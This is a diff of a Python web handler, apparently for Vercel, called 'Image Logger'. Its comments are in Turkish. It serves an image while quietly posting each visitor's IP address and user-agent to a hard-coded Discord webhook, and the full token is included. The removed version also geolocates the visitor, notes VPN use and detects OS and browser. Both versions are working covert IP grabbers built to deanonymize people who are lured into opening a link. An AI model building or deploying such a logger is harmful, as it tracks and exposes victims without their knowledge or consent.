@@ -1,58 +1,53 @@
 from http.server import BaseHTTPRequestHandler
-from urllib import parse
-import requests, base64, httpagentparser
+import requests
 
-config = {
-    "webhook": "https://discord.com/api/webhooks/1489972140680679514/y3WNCXz1DgvFnYtfXME1cWRiEwhoBATmkDnUfI85b07Sl93r3QGePcnWJlzTOcpjU8hC",
-    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200",
-    "username": "Image Logger",
-    "color": 0x00FFFF
-}
+# ===================== CONFIG =====================
+WEBHOOK = "https://discord.com/api/webhooks/1489972140680679514/y3WNCXz1DgvFnYtfXME1cWRiEwhoBATmkDnUfI85b07Sl93r3QGePcnWJlzTOcpjU8hC"
+IMAGE_URL = "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200"
 
 class handler(BaseHTTPRequestHandler):
     def do_GET(self):
         try:
-            # IP al
-            ip = self.headers.get('x-forwarded-for') or self.client_address[0]
-            useragent = self.headers.get('user-agent')
+            # IP al (Vercel'de en güvenli yöntem)
+            ip = self.headers.get("x-forwarded-for") or "Unknown"
+            useragent = self.headers.get("user-agent", "Unknown")
 
-            # Detaylı bilgi al
+            # Basit IP logu gönder (daha az hata şansı)
             try:
-                info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=8).json()
+                embed = {
+                    "username": "Image Logger",
+                    "embeds": [{
+                        "title": "✅ Image Logger - New Hit",
+                        "color": 0x00FFFF,
+                        "description": f"**Birisi resmi açtı!**\n**IP:** `{ip}`\n**User-Agent:** `{useragent[:200]}`",
+                        "timestamp": "now"
+                    }]
+                }
+                requests.post(WEBHOOK, json=embed, timeout=6)
             except:
-                info = {}
+                pass  # webhook hata verse bile devam et
 
-            os, browser = httpagentparser.simple_detect(useragent or "")
-
-            # Discord'a gönder
-            embed = {
-                "username": config["username"],
-                "embeds": [{
-                    "title": "Image Logger - New Hit",
-                    "color": config["color"],
-                    "fields": [
-                        {"name": "IP", "value": f"`{ip}`", "inline": False},
-                        {"name": "Provider", "value": f"`{info.get('isp', 'Unknown')}`", "inline": True},
-                        {"name": "Country", "value": f"`{info.get('country', 'Unknown')}`", "inline": True},
-                        {"name": "City", "value": f"`{info.get('city', 'Unknown')}`", "inline": True},
-                        {"name": "VPN", "value": f"`{info.get('proxy', False)}`", "inline": True},
-                        {"name": "OS", "value": f"`{os}`", "inline": True},
-                        {"name": "Browser", "value": f"`{browser}`", "inline": True},
-                    ]
-                }]
-            }
-            requests.post(config["webhook"], json=embed)
-
-            # Resmi göster
+            # Fotoğrafı göster (en basit yöntem)
             self.send_response(200)
-            self.send_header('Content-type', 'text/html')
+            self.send_header("Content-type", "text/html")
             self.end_headers()
-            self.wfile.write(f'<img src="{config["image"]}" style="width:100%; height:100vh; object-fit:contain; background:black;">'.encode())
+            html = f'''
+            <html>
+            <head><title>Loading...</title></head>
+            <body style="margin:0;background:black;">
+                <img src="{IMAGE_URL}" style="width:100vw;height:100vh;object-fit:contain;">
+            </body>
+            </html>
+            '''.encode()
+            self.wfile.write(html)
 
         except:
-            self.send_response(500)
+            # Herhangi bir şey çökerse bile boş bir resim sayfası göster
+            self.send_response(200)
+            self.send_header("Content-type", "text/html")
             self.end_headers()
+            self.wfile.write(b'<html><body style="background:black;color:white;text-align:center;padding-top:100px;"><h1>Error but trying to show image...</h1></body></html>')
 
-# VERCEL İÇİN ZORUNLU HANDLER
+# Vercel için zorunlu
 def handler(event, context=None):
     return handler
